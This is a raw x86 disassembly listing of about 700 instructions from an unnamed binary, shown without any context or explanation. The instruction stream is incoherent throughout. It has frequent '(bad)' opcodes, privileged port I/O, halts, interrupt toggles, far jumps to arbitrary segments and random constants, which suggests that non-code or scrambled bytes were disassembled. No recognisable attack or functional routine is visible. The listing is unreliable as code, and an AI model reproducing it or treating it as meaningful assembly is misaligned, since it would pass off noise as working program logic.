  419738:	mov    ds:0x80e0c2f9,eax
  41973d:	mov    esp,0x2e8e1388
  419742:	outs   dx,BYTE PTR ds:[esi]
  419743:	gs or  ecx,esp
  419746:	jae    0x4197c5
  419748:	lods   eax,DWORD PTR ds:[esi]
  419749:	leave  
  41974a:	dec    esp
  41974b:	clc    
  41974c:	pop    ss
  41974d:	mov    ah,0x18
  41974f:	mov    edx,0x6383f835
  419754:	ins    DWORD PTR es:[edi],dx
  419755:	hlt    
  419756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419757:	sbb    dh,BYTE PTR [edx]
  419759:	in     eax,dx
  41975a:	jo     0x419790
  41975c:	mov    BYTE PTR [eax],bh
  41975e:	xor    bh,bh
  419760:	pushf  
  419761:	mov    edx,DWORD PTR [edx+edi*4]
  419764:	div    BYTE PTR [esi-0x63]
  419767:	jnp    0x41973d
  419769:	jecxz  0x419754
  41976b:	(bad)  
  41976c:	sbb    bh,cl
  41976e:	pop    DWORD PTR [edx]
  419770:	push   edx
  419771:	xchg   esp,eax
  419772:	mov    al,ds:0x1a98b1f0
  419777:	mov    dl,0x7b
  419779:	sub    BYTE PTR [esi-0x5a990bda],ch
  41977f:	jmp    0x5885dac3
  419784:	cli    
  419785:	ins    DWORD PTR es:[edi],dx
  419786:	xor    ebp,DWORD PTR [esi+0x165b04fa]
  41978c:	jae    0x4197fa
  41978e:	rol    BYTE PTR [ebp+0x216581ca],0xe1
  419795:	cmovle edx,ebx
  419798:	(bad)  
  419799:	pop    ecx
  41979a:	popf   
  41979b:	test   ah,dl
  41979d:	or     DWORD PTR [edi-0x59],0x6d
  4197a1:	push   es
  4197a2:	xchg   edx,eax
  4197a3:	mov    gs,WORD PTR [ebp+ebx*2-0x66]
  4197a7:	dec    ebx
  4197a8:	not    dh
  4197aa:	outs   dx,DWORD PTR ds:[esi]
  4197ab:	push   0xffffff87
  4197ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197ae:	adc    eax,0xc197467e
  4197b3:	pop    esp
  4197b4:	shr    ebp,cl
  4197b6:	inc    ebx
  4197b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b8:	aam    0x35
  4197ba:	and    BYTE PTR [edi+0x27a7ba21],bl
  4197c0:	mov    eax,gs
  4197c2:	and    DWORD PTR [edi-0x1],esp
  4197c5:	inc    esp
  4197c6:	mov    ds:0x9007fa3b,al
  4197cb:	enter  0x1d32,0x13
  4197cf:	stc    
  4197d0:	xor    esi,DWORD PTR [edx+0x31]
  4197d3:	jnp    0x4197c2
  4197d5:	mov    eax,0x620ecd0c
  4197da:	daa    
  4197db:	add    eax,DWORD PTR [edx+0x1deb52e6]
  4197e1:	ror    DWORD PTR [ebp+0x24],1
  4197e4:	cmp    al,0x2a
  4197e6:	pop    ss
  4197e7:	sbb    edx,DWORD PTR [eax-0x40]
  4197ea:	sub    ah,BYTE PTR [ebp-0xe9e3c47]
  4197f0:	cmp    bl,BYTE PTR [ecx-0xb]
  4197f3:	or     ebx,esp
  4197f5:	fisubr DWORD PTR [esi+0x49dab3ec]
  4197fb:	adc    ch,BYTE PTR [edx+0x3194b62e]
  419801:	repnz inc ebp
  419803:	je     0x4197d9
  419805:	out    0x5e,al
  419807:	or     bh,BYTE PTR [ecx*4+0x7406acf0]
  41980e:	int    0xed
  419810:	shl    DWORD PTR [ebx+edi*2],1
  419813:	push   ebx
  419814:	pop    eax
  419815:	mov    ds:0x8652c9d0,al
  41981a:	fadd   st(5),st
  41981c:	sar    bl,0x9c
  41981f:	xor    DWORD PTR [edx+0x1f],esp
  419822:	or     bh,BYTE PTR [eax]
  419824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419825:	aad    0x7f
  419827:	sub    BYTE PTR [ebp+0x1c],ch
  41982a:	push   es
  41982b:	in     al,dx
  41982c:	mov    edx,0x8b813496
  419831:	xchg   edi,eax
  419832:	int3   
  419833:	popf   
  419834:	std    
  419835:	sbb    esp,0x35f5f1b7
  41983b:	xor    dh,BYTE PTR [edx-0x7c454679]
  419841:	mov    ds:0x8ff392f9,al
  419846:	(bad)  
  419847:	jmp    0x6c10:0xfb7ea944
  41984e:	inc    esi
  41984f:	sub    ch,BYTE PTR [edi+ecx*4+0x1fbf0229]
  419856:	mov    dh,al
  419858:	push   edi
  419859:	inc    ecx
  41985a:	cmp    dl,dl
  41985c:	pop    es
  41985d:	mov    dl,0x24
  41985f:	fistp  DWORD PTR [esi+esi*2+0x57]
  419863:	adc    BYTE PTR [edi+0x53],0x9
  419867:	inc    esp
  419868:	mov    ah,BYTE PTR [eax+0x55d39fce]
  41986e:	adc    DWORD PTR [edi+eax*2],ebp
  419871:	mov    ch,0x48
  419873:	stos   BYTE PTR es:[edi],al
  419874:	pop    esi
  419875:	lds    eax,FWORD PTR [eax]
  419877:	(bad)  
  419878:	mov    eax,0xab015c09
  41987d:	lock add bh,ch
  419880:	cmp    eax,0x5293dd75
  419885:	pushf  
  419886:	fbld   TBYTE PTR [edx]
  419888:	jl     0x4198e6
  41988a:	pop    ss
  41988b:	or     eax,DWORD PTR [ebp+0x18]
  41988e:	inc    ecx
  41988f:	jbe    0x419858
  419891:	dec    esi
  419892:	enter  0xff08,0xa8
  419896:	rcl    DWORD PTR [esi+0x2e],1
  419899:	push   ss
  41989a:	sub    ah,bl
  41989c:	sbb    al,0x8a
  41989e:	arpl   WORD PTR [ecx-0x7331ad06],si
  4198a4:	push   es
  4198a5:	cmp    al,0xd8
  4198a7:	imul   BYTE PTR [eax-0x73fec2f]
  4198ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198ae:	pop    ds
  4198af:	js     0x41985b
  4198b1:	xchg   DWORD PTR es:[ebp+0x0],edi
  4198b5:	jb     0x41990b
  4198b7:	mov    edi,edi
  4198b9:	sbb    eax,esi
  4198bb:	into   
  4198bc:	push   esi
  4198bd:	enter  0x7f2d,0x69
  4198c1:	icebp  
  4198c2:	(bad)  
  4198c3:	stc    
  4198c4:	mov    eax,ss:0xad369104
  4198ca:	mov    ?,WORD PTR [edx-0x77b1a282]
  4198d0:	dec    eax
  4198d1:	jmp    0x768e:0x176f7b32
  4198d8:	ss (bad) 
  4198da:	inc    ebx
  4198db:	push   0x495bc7be
  4198e0:	fs in  eax,dx
  4198e2:	pop    ebp
  4198e3:	lahf   
  4198e4:	(bad)  [ebx+0x342194be]
  4198ea:	lahf   
  4198eb:	adc    bl,BYTE PTR [edi]
  4198ed:	xchg   ebx,eax
  4198ee:	jbe    0x419953
  4198f0:	fdivr  QWORD PTR [esi+edx*1]
  4198f3:	xchg   edx,eax
  4198f4:	pop    ecx
  4198f5:	lea    edi,[edi]
  4198f7:	jo     0x4198eb
  4198f9:	inc    eax
  4198fa:	out    0xae,al
  4198fc:	pop    esi
  4198fd:	jle    0x419927
  4198ff:	push   ebx
  419900:	sbb    dl,BYTE PTR [edx-0x74929668]
  419906:	mov    cl,0x79
  419908:	sub    eax,0x3f5e7623
  41990d:	push   esi
  41990e:	cs mov edi,0x453318da
  419914:	js     0x419924
  419916:	xchg   DWORD PTR [esi+0x27],ebx
  419919:	push   0xffffff8c
  41991b:	enter  0x5909,0x2e
  41991f:	jae    0x419901
  419921:	mov    al,0x65
  419923:	dec    ebx
  419924:	aam    0x93
  419926:	cmp    bh,cl
  419928:	lods   al,BYTE PTR cs:[esi]
  41992a:	sti    
  41992b:	push   ecx
  41992c:	into   
  41992d:	or     dl,BYTE PTR [ebx+eax*1-0x63]
  419931:	jb     0x4198ba
  419933:	int3   
  419934:	fs dec esi
  419936:	cmp    DWORD PTR ds:[edi+edx*8-0x649b9f26],eax
  41993e:	iret   
  41993f:	sar    DWORD PTR [edx],cl
  419941:	xchg   ebx,eax
  419942:	xor    BYTE PTR [ebp+0x46da67ec],al
  419948:	jecxz  0x419987
  41994a:	xor    bl,bh
  41994c:	es out 0x8b,eax
  41994f:	(bad)  
  419950:	jecxz  0x41996a
  419952:	cmp    esi,edx
  419954:	push   esi
  419955:	xchg   edx,eax
  419956:	and    al,0x37
  419958:	into   
  419959:	cmc    
  41995a:	pop    ecx
  41995b:	ja     0x419979
  41995d:	fst    DWORD PTR [esi]
  41995f:	ret    0x999c
  419962:	jle    0x4199dd
  419964:	pop    ecx
  419965:	add    eax,0xe0e1fa06
  41996a:	sbb    DWORD PTR [eax],ebp
  41996c:	mov    edi,0x2069cd71
  419971:	jbe    0x4199af
  419973:	enter  0xe826,0x6f
  419977:	inc    ebx
  419978:	in     eax,dx
  419979:	mov    ch,0xc4
  41997b:	sbb    BYTE PTR [ebp-0x22a440a7],bh
  419981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419982:	and    bh,BYTE PTR [ebp+0x49]
  419985:	sbb    eax,0xf5d8dbbc
  41998a:	lds    ecx,FWORD PTR [ebx-0x12361310]
  419990:	jg     0x4199d4
  419992:	push   edx
  419993:	mov    WORD PTR [edi-0x41],ss
  419996:	pop    ss
  419997:	cdq    
  419998:	dec    BYTE PTR [edx+0x62]
  41999b:	cmp    esi,ebp
  41999d:	es nop
  41999f:	call   0x3b64:0x96dab337
  4199a6:	in     al,dx
  4199a7:	jnp    0x419940
  4199a9:	(bad)  
  4199aa:	push   edi
  4199ab:	es test eax,0x785347d8
  4199b1:	dec    edi
  4199b2:	shr    BYTE PTR [ecx+0x47],0xf7
  4199b6:	push   ss
  4199b7:	into   
  4199b8:	add    al,0x33
  4199ba:	rol    ch,0x66
  4199bd:	dec    ebp
  4199be:	loopne 0x419997
  4199c0:	mov    edi,0xb6866985
  4199c5:	cdq    
  4199c6:	rcl    bl,1
  4199c8:	ds into 
  4199ca:	mov    ebx,DWORD PTR [esi+0x40913a4d]
  4199d0:	jbe    0x419974
  4199d2:	out    dx,eax
  4199d3:	ins    BYTE PTR es:[edi],dx
  4199d4:	xor    BYTE PTR [edx+ecx*8],al
  4199d7:	lds    ecx,FWORD PTR [esi]
  4199d9:	xchg   esp,eax
  4199da:	jbe    0x4199f8
  4199dc:	mov    edx,0x7b43f9f9
  4199e1:	dec    edi
  4199e2:	cmp    esi,DWORD PTR [edi]
  4199e4:	or     edx,DWORD PTR [ebx-0x5ad3a99b]
  4199ea:	push   0xffffff97
  4199ec:	lahf   
  4199ed:	es fwait
  4199ef:	xchg   ebx,eax
  4199f0:	mov    dh,BYTE PTR ss:[ebx-0x3b]
  4199f4:	mov    esi,esi
  4199f6:	(bad)  
  4199f7:	jp     0x419a2c
  4199f9:	cmp    BYTE PTR [esi],cl
  4199fb:	push   0x7
  4199fd:	pop    ecx
  4199fe:	adc    eax,0x8d81215f
  419a03:	pop    ss
  419a04:	fidiv  DWORD PTR [edx+0x6a]
  419a07:	sbb    eax,0x4b5b0b3b
  419a0c:	popa   
  419a0d:	dec    eax
  419a0e:	in     al,dx
  419a0f:	mov    BYTE PTR [edx+0x71c65792],dl
  419a15:	hlt    
  419a16:	test   al,0xca
  419a18:	pop    ebp
  419a19:	inc    ebx
  419a1a:	sub    DWORD PTR [edx+ebx*4-0x5c],eax
  419a1e:	sbb    ebx,DWORD PTR [ebx-0xcb38158]
  419a24:	addr16 aam 0x26
  419a27:	(bad)  
  419a28:	ret    
  419a29:	jb     0x419a41
  419a2b:	dec    ebp
  419a2c:	outs   dx,BYTE PTR ds:[esi]
  419a2d:	leave  
  419a2e:	popf   
  419a2f:	mov    ah,dh
  419a31:	nop
  419a32:	xor    ah,BYTE PTR [edi]
  419a34:	sbb    cl,BYTE PTR [edx+0x775e2ca6]
  419a3a:	outs   dx,BYTE PTR ds:[esi]
  419a3b:	inc    esi
  419a3c:	add    esp,DWORD PTR [ebp+0x4a]
  419a3f:	icebp  
  419a40:	sti    
  419a41:	ins    DWORD PTR es:[edi],dx
  419a42:	sbb    edx,edx
  419a44:	and    dh,BYTE PTR [esi]
  419a46:	and    ecx,ecx
  419a48:	or     ecx,eax
  419a4a:	mov    esp,0x9b25f661
  419a4f:	enter  0x2366,0xa7
  419a53:	out    dx,al
  419a54:	add    al,BYTE PTR [ecx]
  419a56:	push   0x62
  419a58:	jmp    0x419a39
  419a5a:	daa    
  419a5b:	cmp    ecx,DWORD PTR [edx-0x33]
  419a5e:	sub    al,0x73
  419a60:	punpcklwd mm3,mm4
  419a63:	jb     0x419a55
  419a65:	xacquire lock xchg BYTE PTR [edi-0x470dfadc],ah
  419a6d:	pop    esp
  419a6e:	int    0x53
  419a70:	jp     0x419a38
  419a72:	das    
  419a73:	bound  eax,QWORD PTR [ecx+0x4f]
  419a76:	cdq    
  419a77:	loopne 0x419a82
  419a79:	mov    ebp,0x79a53e50
  419a7e:	cli    
  419a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a80:	fmul   DWORD PTR [ebx+ecx*2]
  419a83:	jbe    0x419a6b
  419a85:	xchg   ebx,eax
  419a86:	sbb    al,0xe8
  419a88:	push   ds
  419a89:	sbb    ecx,ebx
  419a8b:	hlt    
  419a8c:	xor    DWORD PTR [esi],ebp
  419a8e:	dec    edx
  419a8f:	ss scas al,BYTE PTR es:[edi]
  419a91:	daa    
  419a92:	lahf   
  419a93:	and    DWORD PTR [edi-0x7c],0x5959ed37
  419a9a:	pop    esi
  419a9b:	fcmovnb st,st(7)
  419a9d:	test   ebx,0x2f8e079b
  419aa3:	jo     0x419aee
  419aa5:	xor    BYTE PTR [ebx],bh
  419aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa8:	mov    bl,0x5e
  419aaa:	fistp  DWORD PTR ds:0x8a630356
  419ab0:	push   esi
  419ab1:	dec    ebp
  419ab2:	pop    edi
  419ab3:	xor    al,0x8f
  419ab5:	jns    0x419a52
  419ab7:	push   ecx
  419ab8:	push   ebx
  419ab9:	pop    es
  419aba:	jecxz  0x419b35
  419abc:	lds    edx,FWORD PTR [edi]
  419abe:	imul   ecx,DWORD PTR [edi-0x4e],0x15
  419ac2:	dec    ecx
  419ac3:	hlt    
  419ac4:	pop    edi
  419ac5:	adc    al,0x5c
  419ac7:	jns    0x419ad3
  419ac9:	xlat   BYTE PTR ds:[ebx]
  419aca:	jbe    0x419ad1
  419acc:	hlt    
  419acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ace:	inc    DWORD PTR [ecx+0x6b89d517]
  419ad4:	dec    esp
  419ad5:	std    
  419ad6:	adc    DWORD PTR ds:0x8a50388d,0x413f539
  419ae0:	je     0x419a8c
  419ae2:	sahf   
  419ae3:	out    dx,al
  419ae4:	sti    
  419ae5:	or     al,0xe5
  419ae7:	ficom  WORD PTR [ebx+ebp*2+0x49]
  419aeb:	sub    esi,ebp
  419aed:	arpl   dx,bp
  419aef:	mov    bl,0xe2
  419af1:	clc    
  419af2:	js     0x419b4c
  419af4:	in     eax,0x8a
  419af6:	shr    DWORD PTR [ebx+ebx*2-0x7d1dc9ac],0xea
  419afe:	out    dx,eax
  419aff:	daa    
  419b00:	test   BYTE PTR [edi-0x30811fc8],cl
  419b06:	pop    es
  419b07:	inc    ebp
  419b08:	ret    
  419b09:	sar    DWORD PTR [ecx+0x72],cl
  419b0c:	inc    esp
  419b0d:	ficom  DWORD PTR [ebx+eax*2]
  419b10:	fcom   QWORD PTR [ebp+ecx*8-0x63]
  419b14:	dec    edx
  419b15:	fsubr  QWORD PTR [esp+eiz*2+0x27]
  419b19:	xchg   esi,eax
  419b1a:	idiv   dh
  419b1c:	mov    bh,0x86
  419b1e:	imul   esi,DWORD PTR [ebx-0x5bc63dde],0x40be8f3
  419b28:	mov    bh,0x65
  419b2a:	dec    edi
  419b2b:	jecxz  0x419b95
  419b2d:	fucomip st,st(7)
  419b2f:	in     eax,0xf3
  419b31:	xlat   BYTE PTR ds:[ebx]
  419b32:	mov    al,ds:0xe5f0c062
  419b37:	das    
  419b38:	in     al,0x3
  419b3a:	je     0x419b4f
  419b3c:	in     eax,0x91
  419b3e:	inc    esp
  419b3f:	jle    0x419b07
  419b41:	call   0x7030b33e
  419b46:	imul   esi,DWORD PTR [ebp-0x241d4428],0x21
  419b4d:	and    eax,0x6893a2dc
  419b52:	cmp    DWORD PTR [edi-0x2a8d6d5f],edi
  419b58:	in     eax,dx
  419b59:	xchg   esp,eax
  419b5a:	push   ebx
  419b5b:	pop    esi
  419b5c:	icebp  
  419b5d:	repz loopne 0x419b44
  419b60:	sub    al,0x5
  419b62:	inc    esi
  419b63:	gs mov al,0xc8
  419b66:	mov    ds:0x6b90d6f6,al
  419b6b:	fucom  st(3)
  419b6d:	mov    esi,0xed66c647
  419b72:	pusha  
  419b73:	icebp  
  419b74:	out    dx,al
  419b75:	fstp   st(5)
  419b77:	xlat   BYTE PTR ds:[ebx]
  419b78:	stc    
  419b79:	mov    ds:0xcee56287,eax
  419b7e:	mov    eax,0x648c9d71
  419b83:	into   
  419b84:	sbb    BYTE PTR [ebx-0x11d7c1],bl
  419b8a:	(bad)  
  419b8b:	out    0x7d,al
  419b8d:	mov    DWORD PTR [esi],edx
  419b8f:	js     0x419b18
  419b91:	push   es
  419b92:	mov    ch,0x9f
  419b94:	stc    
  419b95:	inc    edi
  419b96:	fist   WORD PTR [ebx+eiz*1-0x1]
  419b9a:	mov    gs:0xbc15eda5,eax
  419ba0:	jno    0x419b38
  419ba2:	xor    DWORD PTR [esi],esp
  419ba4:	bound  ecx,QWORD PTR [esp+ecx*8-0x3]
  419ba8:	pop    edi
  419ba9:	loope  0x419bfb
  419bab:	add    dh,BYTE PTR [ebp+0x63]
  419bae:	sbb    BYTE PTR [ebp+eax*1+0x5bc5e108],0x66
  419bb6:	cli    
  419bb7:	add    eax,0x63482c11
  419bbc:	mov    ebp,cs
  419bbe:	mov    bl,0x71
  419bc0:	out    dx,al
  419bc1:	std    
  419bc2:	jl     0x419c2c
  419bc4:	xchg   edx,eax
  419bc5:	xchg   ebp,eax
  419bc6:	pop    edx
  419bc7:	loop   0x419b9e
  419bc9:	pop    ebp
  419bca:	dec    eax
  419bcb:	aas    
  419bcc:	push   es
  419bcd:	push   0x3b
  419bcf:	and    DWORD PTR [esi],esp
  419bd1:	mov    edx,0xc1b063ba
  419bd6:	sbb    dh,bh
  419bd8:	add    DWORD PTR ds:0xad17145a,0x62
  419bdf:	jnp    0x419b74
  419be1:	mov    ch,0x9b
  419be3:	sbb    eax,0xfb664f8
  419be8:	push   0x1769a382
  419bed:	outs   dx,DWORD PTR ds:[esi]
  419bee:	dec    eax
  419bef:	pop    esp
  419bf0:	outs   dx,BYTE PTR ds:[esi]
  419bf1:	dec    edx
  419bf2:	add    cl,bl
  419bf4:	imul   ebx,ebp,0xa31ec0a7
  419bfa:	aam    0x23
  419bfc:	test   eax,0x72306965
  419c01:	fisub  DWORD PTR [edx-0x28e4436d]
  419c07:	jbe    0x419c69
  419c09:	es pop ss
  419c0b:	jecxz  0x419bc9
  419c0d:	sub    DWORD PTR [edi],0xdfcf39c5
  419c13:	call   0xa7e38fdd
  419c18:	out    0xb7,eax
  419c1a:	xchg   ebp,eax
  419c1b:	sub    ah,BYTE PTR [ebx-0x4dadec9b]
  419c21:	outs   dx,BYTE PTR ds:[esi]
  419c22:	xor    ecx,DWORD PTR [ebx-0x52b06fe]
  419c28:	retf   0x4d54
  419c2b:	and    BYTE PTR [esi+0x54a0a74c],dh
  419c31:	mov    edi,DWORD PTR [esi+0x641fde6d]
  419c37:	or     ah,ch
  419c39:	mov    BYTE PTR [ebx-0x7b831dd4],bl
  419c3f:	push   eax
  419c40:	push   edi
  419c41:	xchg   ebx,eax
  419c42:	push   edx
  419c43:	or     DWORD PTR [edi],0xffffffc7
  419c46:	xor    DWORD PTR ds:0x35efa5c1,0xffffffdf
  419c4d:	in     al,dx
  419c4e:	out    0x7a,al
  419c50:	js     0x419c58
  419c52:	mov    ecx,ebp
  419c54:	push   ebp
  419c55:	cmp    al,0xfb
  419c57:	enter  0x3ed4,0xa0
  419c5b:	daa    
  419c5c:	dec    esp
  419c5d:	les    ebp,FWORD PTR [esi+0x5930b6fd]
  419c63:	sbb    bh,BYTE PTR [eax]
  419c65:	int    0x84
  419c67:	dec    edi
  419c68:	int    0xfe
  419c6a:	aas    
  419c6b:	cmc    
  419c6c:	sbb    eax,0x9558d0fb
  419c71:	xor    bh,ah
  419c73:	jge    0x419cc2
  419c75:	mov    cl,0x60
  419c77:	add    BYTE PTR [ecx+0x427e74a1],bl
  419c7d:	dec    ebp
  419c7e:	push   ebx
  419c7f:	pop    ds
  419c80:	scas   al,BYTE PTR es:[edi]
  419c81:	push   edi
  419c82:	std    
  419c83:	sub    dh,cl
  419c85:	sub    DWORD PTR [edx-0x71],0x7066f964
  419c8c:	add    eax,0x90cdf84d
  419c91:	sti    
  419c92:	std    
  419c93:	dec    esp
  419c94:	push   esi
  419c95:	adc    ebx,DWORD PTR [ebp+eiz*4-0x26]
  419c99:	xchg   edi,eax
  419c9a:	shr    DWORD PTR [edx+0x68],cl
  419c9d:	in     al,dx
  419c9e:	xchg   ebp,eax
  419c9f:	mov    edx,0x48479cde
  419ca4:	sti    
  419ca5:	in     eax,dx
  419ca6:	adc    DWORD PTR [ecx-0x75],0x1263c8c
  419cad:	jg     0x419ce6
  419caf:	sbb    eax,0xd0f0a69a
  419cb4:	cmp    DWORD PTR [ebp-0x6d],esi
  419cb7:	jl     0x419c53
  419cb9:	stos   BYTE PTR es:[di],al
  419cbb:	mov    al,0xef
  419cbd:	jmp    0x133d8d44
  419cc2:	xchg   ecx,eax
  419cc3:	inc    esp
  419cc4:	in     al,dx
  419cc5:	mov    ?,WORD PTR [eax]
  419cc7:	pop    eax
  419cc8:	jmp    0x5735:0xf13c91f8
  419ccf:	icebp  
  419cd0:	imul   eax,DWORD PTR [esi+0x17],0xffffffda
  419cd4:	rol    ebx,1
  419cd6:	fsub   st,st(5)
  419cd8:	cdq    
  419cd9:	push   0x3a138b52
  419cde:	adc    DWORD PTR [ecx-0x6b64f6d2],0x4f
  419ce5:	hlt    
  419ce6:	mov    ebx,0xe2b08a4e
  419ceb:	push   0xe242e46a
  419cf0:	and    eax,0x79d69cb5
  419cf5:	dec    esi
  419cf6:	(bad)  
  419cf7:	(bad)  
  419cf8:	sti    
  419cf9:	inc    edi
  419cfa:	rcl    ebx,cl
  419cfc:	mov    edi,0xe7148203
  419d01:	in     eax,0x69
  419d03:	xchg   ebx,eax
  419d04:	pusha  
  419d05:	xor    bh,BYTE PTR [esi-0x21]
  419d08:	adc    eax,0xd00a2d4b
  419d0d:	call   0xf286:0x3f411e8f
  419d14:	mov    ch,0x6f
  419d16:	lods   eax,DWORD PTR ds:[esi]
  419d17:	clc    
  419d18:	inc    eax
  419d19:	imul   ebx,DWORD PTR [ecx],0xffffffc6
  419d1c:	fadd   st,st(2)
  419d1e:	mov    eax,0xf0895c21
  419d23:	mov    esp,0xc4c24e8f
  419d28:	xor    DWORD PTR [eax+0x9f3b663],esi
  419d2e:	stos   DWORD PTR es:[edi],eax
  419d2f:	(bad)  
  419d31:	adc    DWORD PTR [edx],esi
  419d33:	xchg   edi,eax
  419d34:	pushf  
  419d35:	outs   dx,DWORD PTR ds:[esi]
  419d36:	mov    esi,0xcb2fd53d
  419d3b:	pop    ss
  419d3c:	fcomip st,st(5)
  419d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d3f:	dec    edx
  419d40:	sub    BYTE PTR [ecx+ecx*4-0x7035a261],ch
  419d47:	cmp    edi,DWORD PTR [edi+0x2e9d9e15]
  419d4d:	push   eax
  419d4e:	imul   esp,ebx,0xefeab2d0
  419d54:	mov    fs,WORD PTR [ecx-0x68]
  419d57:	inc    esi
  419d58:	cli    
  419d59:	jmp    0x7e97:0x5713b2db
  419d60:	inc    ecx
  419d61:	push   eax
  419d62:	jb     0x419d21
  419d64:	pusha  
  419d65:	cmp    DWORD PTR [ebp-0x6b],esp
  419d68:	mov    ebp,0x8c523d71
  419d6d:	adc    ch,BYTE PTR [ebp+0x70814bf1]
  419d73:	xchg   ecx,eax
  419d74:	jecxz  0x419dbf
  419d76:	inc    ecx
  419d77:	cmp    esi,DWORD PTR [ebx+0x1c]
  419d7a:	dec    edx
  419d7b:	popf   
  419d7c:	fisttp QWORD PTR [edi-0x2497bea8]
  419d82:	sti    
  419d83:	mov    edx,0x2869b31f
  419d88:	add    bl,BYTE PTR [ecx]
  419d8a:	adc    eax,0x9617904b
  419d8f:	mov    ah,0x6b
  419d91:	and    eax,0xc8cb6237
  419d96:	sub    ecx,DWORD PTR [edx+0x24]
  419d99:	pop    ds
  419d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d9b:	jne    0x419d1e
  419d9d:	out    0x49,eax
  419d9f:	stos   DWORD PTR es:[edi],eax
  419da0:	enter  0xb2ab,0x58
  419da4:	jae    0x419d7e
  419da6:	dec    eax
  419da7:	fsub   QWORD PTR [edi-0x44]
  419dab:	fwait
  419dac:	cli    
  419dad:	mov    ch,0x58
  419daf:	pop    ebp
  419db0:	sub    cl,BYTE PTR [edi+0x4ed326d7]
  419db6:	inc    edx
  419db7:	or     DWORD PTR [esi+0x25a6ceb0],0x73360a17
  419dc1:	jg     0x419dc5
  419dc3:	cld    
  419dc4:	mov    dl,0x9c
  419dc6:	inc    esi
  419dc7:	test   al,0xb2
  419dc9:	sub    edi,DWORD PTR [ebp+0x6a]
  419dcc:	push   ebx
  419dcd:	mov    BYTE PTR [eax+edi*8-0xc],ah
  419dd1:	and    al,0xe7
  419dd3:	pop    esp
  419dd4:	push   edx
  419dd5:	mov    ch,0xc6
  419dd7:	xlat   BYTE PTR ds:[ebx]
  419dd8:	(bad)  
  419dd9:	fdivr  st(5),st
  419ddb:	in     al,dx
  419ddc:	(bad)  
  419ddd:	loope  0x419e1c
  419ddf:	sbb    DWORD PTR [ecx],edi
  419de1:	sti    
  419de2:	xor    DWORD PTR [edi-0x68],0x953a5af5
  419de9:	lea    edi,[ecx-0x13]
  419dec:	pop    eax
  419ded:	add    BYTE PTR [edi+0x6c],dl
  419df0:	je     0x419e34
  419df2:	icebp  
  419df3:	jb     0x419db0
  419df5:	fcom   st(6)
  419df7:	add    bl,bh
  419df9:	rcl    DWORD PTR [ecx-0x31],1
  419dfc:	sbb    al,0xf2
  419dfe:	mov    ds:0xd731fb7a,eax
  419e03:	pop    es
  419e04:	xor    BYTE PTR [edi-0x32],dl
  419e07:	sub    al,dh
  419e09:	adc    al,0x90
  419e0b:	call   0xbe32660c
  419e10:	mov    ecx,0x33a729e5
  419e15:	arpl   dx,bp
  419e17:	aaa    
  419e18:	xor    cl,BYTE PTR [ebx+ebx*1-0x1882cce3]
  419e1f:	idiv   DWORD PTR [eax]
  419e21:	inc    eax
  419e22:	arpl   WORD PTR [ebp-0x3dadbc33],cx
  419e28:	cwde   
  419e29:	cmp    ebp,esi
  419e2b:	int3   
  419e2c:	fs mov al,0x2
  419e2f:	inc    DWORD PTR [ebx+0x7eee9e42]
  419e35:	out    dx,al
  419e36:	mov    bl,0x4a
  419e38:	jmp    0xfe160eda
  419e3d:	imul   ebp,DWORD PTR [eax+ecx*4],0xce753256
  419e44:	pop    ebx
  419e45:	xchg   DWORD PTR [edi+0x2f],ecx
  419e48:	mov    dh,BYTE PTR [ebx+0x1b8decfd]
  419e4e:	jmp    0x31559075
  419e53:	push   ecx
  419e54:	xchg   BYTE PTR [ebx+eax*4+0x37],ch
  419e58:	push   edx
  419e59:	xor    DWORD PTR [ebp+0x34151886],esi
  419e5f:	fiadd  DWORD PTR [ebp+0x220e58c5]
  419e65:	in     eax,0x74
  419e67:	inc    ecx
  419e68:	pop    ss
  419e69:	lods   al,BYTE PTR ds:[esi]
  419e6a:	imul   edi,DWORD PTR [ebx+edx*2],0xffffffac
  419e6e:	test   BYTE PTR [eax-0x41],bh
  419e71:	mov    ah,0xc5
  419e73:	jle    0x419e3d
  419e75:	loop   0x419e1c
  419e77:	in     al,dx
  419e78:	jo     0x419e2c
  419e7a:	imul   ecx,DWORD PTR [ebx+0x148592b6],0x4ec05faf
  419e84:	pop    edi
  419e85:	in     al,dx
  419e86:	pop    ss
  419e87:	sbb    al,0x1b
  419e89:	loope  0x419e14
  419e8b:	lahf   
  419e8c:	pop    ss
  419e8d:	xor    ebp,DWORD PTR [edx-0xe509d4c]
  419e93:	out    0x72,al
  419e95:	enter  0xcd80,0x5
  419e99:	leave  
  419e9a:	enter  0x83d6,0x49
  419e9e:	dec    ebp
  419e9f:	ds iret 
  419ea1:	je     0x419e64
  419ea3:	aaa    
  419ea4:	inc    ecx
  419ea5:	in     al,dx
  419ea6:	dec    BYTE PTR [eax-0x72]
  419ea9:	jmp    0x419ee4
  419eab:	xchg   BYTE PTR ds:0xdfb003ba,dl
  419eb1:	pop    edx
  419eb2:	mov    cl,0x72
  419eb4:	jae    0x419f25
  419eb6:	scas   eax,DWORD PTR es:[edi]
  419eb7:	adc    esp,edx
  419eb9:	push   ds
  419eba:	inc    eax
  419ebb:	or     DWORD PTR [ebx+eax*1-0x39e951e7],ebp
  419ec2:	push   ebp
  419ec3:	jmp    0x419e99
  419ec5:	mov    ds:0x7563d43d,al
  419eca:	inc    edx
  419ecb:	adc    al,0xf7
  419ecd:	lods   al,BYTE PTR ds:[esi]
  419ece:	xchg   esp,eax
  419ecf:	daa    
  419ed0:	fidivr DWORD PTR [edi+0x4]
  419ed3:	sub    eax,0x50cd5715
  419ed8:	cmp    cl,BYTE PTR [edx+0x2c]
  419edb:	mov    ah,0x44
  419edd:	push   edi
  419ede:	call   0xeb2dca79
  419ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ee4:	mov    BYTE PTR [edx+edx*4+0x68],bh
  419ee8:	and    esp,esp
  419eea:	(bad)  
